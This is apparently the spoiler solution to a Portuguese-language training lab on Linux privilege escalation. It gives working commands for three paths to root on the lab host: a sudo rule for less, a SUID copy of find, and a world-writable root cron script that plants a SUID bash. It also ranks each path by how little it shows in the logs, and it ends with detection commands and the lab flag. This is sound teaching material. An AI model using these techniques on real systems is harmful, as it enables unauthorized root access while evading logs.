# 🔓 Solução — Lab 03

> ⚠️ **Spoiler.** Tente antes de abrir.

## Preparação

```bash
su - dev01
id        # uid=1001(dev01) gid=1001(dev01) groups=1001(dev01)
```

## Tarefa 1 — Enumeração

```bash
sudo -l
```

```
User dev01 may run the following commands on kali:
    (root) NOPASSWD: /usr/bin/less
```

```bash
find / -perm -4000 -type f 2>/dev/null | grep -v -E '^/(usr/)?s?bin/'
# /opt/cyberlab/bin/.cache-helper
```

```bash
ls -la /opt/cyberlab/scripts/
# -rwxrwxrwx 1 root root ... maintenance.sh
cat /etc/cron.d/cyberlab-maintenance
# */2 * * * * root /opt/cyberlab/scripts/maintenance.sh
```

| Vetor | Risco | Exploração |
| :-- | :-- | :-- |
| `sudo less` | executa shell como root | `!sh` dentro do less |
| SUID `.cache-helper` | binário `find` como root | `-exec /bin/sh -p` |
| cron `777` | root executa código do usuário | editar o script |

## Tarefa 2 — Caminho A (`sudo less`)

```bash
sudo less /etc/hosts
```

Dentro do `less`, digite:

```
!sh
```

Agora você é root **naquele shell**:

```bash
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/flag3.txt
exit   # volta ao less
q      # sai do less
```

Por que funciona: o `less` está sendo executado **como root** (por causa da regra de sudo) e oferece o comando `!` para rodar comandos externos — que herdam o privilégio.

### Registro gerado

```
Feb 14 02:15:10 kali sudo: dev01 : TTY=pts/0 ; PWD=/home/dev01 ; USER=root ; COMMAND=/usr/bin/less /etc/hosts
```

O comando `!sh` em si **não** aparece no `sudo` log — só o `less`. É um vetor relativamente discreto.

## Tarefa 3 — Caminho B (SUID)

```bash
file /opt/cyberlab/bin/.cache-helper
# ELF 64-bit LSB pie executable ... (é o find)

ls -l /opt/cyberlab/bin/.cache-helper
# -rwsr-xr-x 1 root root ...
```

Exploração:

```bash
/opt/cyberlab/bin/.cache-helper . -maxdepth 0 -exec /bin/sh -p \; -quit
id
# uid=0(root) ...
```

Por que `-p`: shells modernos **descartam** o privilégio de euid quando a diferença entre real e efetivo é detectada. `-p` preserva o euid 0.

Se você esquecer o `-p`, o shell abre como `dev01` e parece que "não funcionou".

### Registro gerado

Praticamente **nada** por padrão. O processo `.cache-helper` aparece em `ps` enquanto roda, mas não há log de execução. É o vetor mais silencioso dos três.

## Tarefa 4 — Caminho C (cron)

```bash
echo 'cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash' >> /opt/cyberlab/scripts/maintenance.sh
```

Aguarde até 2 minutos. Verificação:

```bash
watch -n 5 ls -l /tmp/rootbash
```

Quando aparecer:

```bash
/tmp/rootbash -p
id
# uid=0(root) ...
```

Limpeza obrigatória:

```bash
# como root
sed -i '/rootbash/d' /opt/cyberlab/scripts/maintenance.sh
rm -f /tmp/rootbash
```

### Registro gerado

O cron registra a **execução do script**, não o que você adicionou nele:

```
Feb 14 02:18:44 kali CRON[4231]: (root) CMD (/opt/cyberlab/scripts/maintenance.sh)
```

Para pegar a alteração, seria necessário auditar escrita no arquivo (`-w /opt/cyberlab/scripts/ -p wa`), que é exatamente a regra `cyberlab_scripts` do lab 07.

## Tarefa 5 — Flag

```bash
cat /root/flag3.txt
```

```
FLAG{r00t_c0nqu1st4d4}
```

## Tarefa 6 — Comparação de stealth

| Vetor | Log | Detecção |
| :-- | :-- | :-- |
| `sudo less` | `sudo: ... COMMAND=/usr/bin/less` | média: parece uso legítimo |
| SUID `find` | nenhum | baixa: precisa de auditoria de execução |
| cron `777` | `CRON: CMD maintenance.sh` | baixa por padrão, alta com auditd em `/etc/cron.d` e no script |

**Conclusão possível:** o SUID é o mais silencioso em log padrão, mas é o mais fácil de **descobrir** por enumeração (`find -perm -4000`). O `sudo` é o mais visível em log, porém o mais "natural" de passar batido em revisão manual. O cron `777` é o que combina **pouca visibilidade** com **alta persistência**.

A resposta certa é a que você consegue justificar com evidência.

## Detecção (o que levar para o lab 06/07)

```bash
# sudo
sudo grep "COMMAND=" /var/log/auth.log | grep -E "less|find|vim|nano|awk"

# SUID fora do padrão (agende isso!)
sudo find / -xdev -perm -4000 -type f 2>/dev/null | grep -v -E '^/(usr/)?s?bin/'

# cron/scripts alterados
sudo ausearch -k cyberlab_scripts -i
sudo ausearch -k cyberlab_cron -i
```

## Lições

1. Escalada não é "exploit": é **configuração** que dá poder demais a quem não deveria.
2. Todo binário que executa comandos (`less`, `find`, `vim`, `awk`, `tar`) vira root se estiver com SUID ou em `sudoers`.
3. `777` em script de root = root para qualquer um, a cada 2 minutos.
4. Quem só procura "CVE" perde o óbvio: três falhas de configuração no mesmo host.
